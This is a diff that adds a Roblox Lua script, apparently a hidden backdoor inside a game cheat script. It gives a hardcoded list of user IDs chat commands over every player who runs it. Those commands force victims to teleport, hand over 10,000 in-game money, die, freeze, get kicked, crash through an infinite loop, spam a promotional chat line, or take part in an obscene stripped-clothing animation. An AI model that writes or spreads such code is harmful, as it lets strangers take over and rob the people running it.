@@ -1,0 +1,242 @@
+
+local whitelist = { owner = {1751432499 , 1810894613 , 521966341 , 2854930671 , 2554956689 , 1296266614 }, admin = { 993338943 },}
+
+_G.bending = false
+owner = false admin = false
+local function runcommand(message,author) owner = false admin = false local player = game.Players[author] for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true end
+	end for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = true end
+	end
+
+	if admin or owner then
+		if message:sub(1, 6) == "/bring" then
+			if message:match(game.Players.LocalPlayer.Name) then
+				local plr = game.Players.LocalPlayer
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
+			end
+		end
+
+		if message:sub(1, 10) == "/reset" then
+			if message:match(".") then
+				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+					if v:IsA('MeshPart') or  v:IsA('Accessory') then
+						v:Destroy()
+					end
+				end
+			end
+		end
+
+		if message:sub(1, 6) == "/money" then
+			if message:match(".") then
+				local plr = game.Players.LocalPlayer
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
+				wait(0.5)
+				game.ReplicatedStorage.MainEvent:FireServer("DropMoney", 10000)
+			end
+		end
+
+		if message:sub(1, 6) == "/bring" then
+			if message:match(".") then
+				local plr = game.Players.LocalPlayer
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
+			end
+		end
+		-- kill start
+		if message:sub(1, 5) == "/kill" then
+			if message:match(game.Players.LocalPlayer.Name) then
+				local plr = game.Players.LocalPlayer
+				game.Players.LocalPlayer.Character.Humanoid.Health = 0
+			end
+		end
+
+		if message:sub(1, 5) == "/save" then
+			if message:match(".") then
+				local plr = game.Players.LocalPlayer
+				local prevpos = plr.Character.HumanoidRootPart.CFrame
+				if game.Players[author].Character.BodyEffects['K.O'].Value == true then
+					repeat
+						plr.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame + Vector3.new(0,2,0)
+						wait(0.2)
+						game.ReplicatedStorage.MainEvent:FireServer('Grabbing', false)
+						wait(0.7)
+					until game.Players[author].Character:FindFirstChild('GRABBING_CONSTRAINT')
+					wait(0.5)
+					plr.Character.HumanoidRootPart.CFrame = CFrame.new(116.730995, 22.7999897, -485.625824, 0.0161760189, 7.01649867e-08, 0.999869168, -4.47058035e-08, 1, -6.94509126e-08, -0.999869168, -4.35765166e-08, 0.0161760189)
+					wait(0.7)
+					game.ReplicatedStorage.MainEvent:FireServer('Grabbing', false)
+					wait(1)
+					plr.Character.HumanoidRootPart.CFrame = CFrame.new(-182.533401, 21.2549973, -445.791351, 0.901822329, 6.20410248e-08, 0.432107031, -3.5154148e-08, 1, -7.02099925e-08, -0.432107031, 4.81265836e-08, 0.901822329)
+				end
+			end
+		end
+
+
+		if message:sub(1, 5) == "/kill" then
+			if message:match(".") then
+				local plr = game.Players.LocalPlayer
+				game.Players.LocalPlayer.Character.Humanoid.Health = 0
+			end
+		end
+		--  kill end
+		-- kick start
+		if message:sub(1, 5) == "/kick" then
+			if message:match(game.Players.LocalPlayer.Name) then
+				local plr = game.Players.LocalPlayer
+				game.Players.LocalPlayer:Kick("kicked by "..author..".")
+
+			end
+		end
+
+		if message:sub(1, 5) == "/kick" then
+			if message:match(".") then
+				local plr = game.Players.LocalPlayer
+				game.Players.LocalPlayer:Kick("kicked by "..author..".")
+			end
+		end
+
+		if message:sub(1, 7) == "/freeze" then
+			if message:match(game.Players.LocalPlayer.Name) then
+				game.Players.LocalPlayer.Character.Head.Anchored = true
+			end
+		end
+
+		if message:sub(1, 7) == "/freeze" then
+			if message:match(".") then
+				game.Players.LocalPlayer.Character.Head.Anchored = true
+			end
+		end
+
+		if message:sub(1, 9) == "/unfreeze" then
+			if message:match(game.Players.LocalPlayer.Name) then
+				game.Players.LocalPlayer.Character.Head.Anchored = false
+			end
+		end
+
+		if message:sub(1, 9) == "/unfreeze" then
+			if message:match(".") then
+				game.Players.LocalPlayer.Character.Head.Anchored = false
+			end
+		end
+
+		if message:sub(1, 5) == "/benx" then
+			if message:match(game.Players.LocalPlayer.Name) then
+				_G.bending = true
+				local segtarget = author.Name
+				local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+				Crouch.Looped = true
+				Crouch:Play()
+				local away = .5
+				local reversing = false
+				local shirt = player.Character:FindFirstChild('Shirt')
+				local pants = player.Character:FindFirstChild('Pants')
+				if shirt then
+					shirt:Destroy()
+				end
+				if pants then
+					pants:Destroy()
+				end
+				local Loop
+				local loopFunction = function()
+					local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+					local character = player.Character
+					if targetchar then
+						if reversing == true then
+							away = away - 0.1
+						else
+							away = away + 0.1
+						end
+						if away >= 2 then
+							reversing = true
+						elseif away < 0.5 then
+							reversing = false
+						end
+						character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+					end
+				end;
+				local Start = function()
+					Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+				end;
+				local Pause = function()
+					Loop:Disconnect()
+					Crouch:Stop()
+				end;
+				Start()	
+				repeat wait() until _G.bending == false
+				Pause()
+			end
+		end
+
+		if message:sub(1, 7) == "/unbenx" then
+			if message:match(game.Players.LocalPlayer.Name) then
+				while _G.bending == true do
+					wait()
+					_G.bending = false
+				end
+			end
+		end
+
+		if message:sub(1, 6) == "/fling" then
+			if message:match(game.Players.LocalPlayer.Name) then
+				local plr = game.Players.LocalPlayer
+				plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+			end
+		end
+
+		if message:sub(1, 6) == "/fling" then
+			if message:match(".") then
+				local plr = game.Players.LocalPlayer
+				plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+			end
+		end
+
+		if message:sub(1, 6) == "/crash" then
+			if message:match(".") then
+				while true do
+					print("Lol u got crashed")
+				end
+			end
+		end
+
+		if message:sub(1, 6) == "/flash" then
+			if message:match(".") then
+				local plr = game.Players.LocalPlayer
+
+			end
+		end
+
+		-- kick end
+		if message == "/bind" then
+			if author ~= game.Players.LocalPlayer.Name then
+				local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+				path:FireServer("ZellHUB winning","all")
+			end
+		end
+
+		if owner then
+			if message:sub(1, 4) == "/ban" then
+				if message:match(game.Players.LocalPlayer.Name) then
+					game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
+					local TeleportService = game:GetService("TeleportService")
+					TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
+				end
+			end
+
+			if message:sub(1, 7) == "/rejoin" then
+				if message:match(".") then
+					local TeleportService = game:GetService("TeleportService")
+					TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
+				end
+			end
+		end
+	end
+end
+
+-- //
+for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.admin) do if v.UserId == _ then admin = true if admin then warn('New admin : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
+end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true if admin then warn('New admin : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
+end)
+
+-- // Owner
+
+for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.owner) do if v.UserId == _ then owner = true if owner then warn('New owner : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
+end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = true if owner then warn('New owner : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
+end)
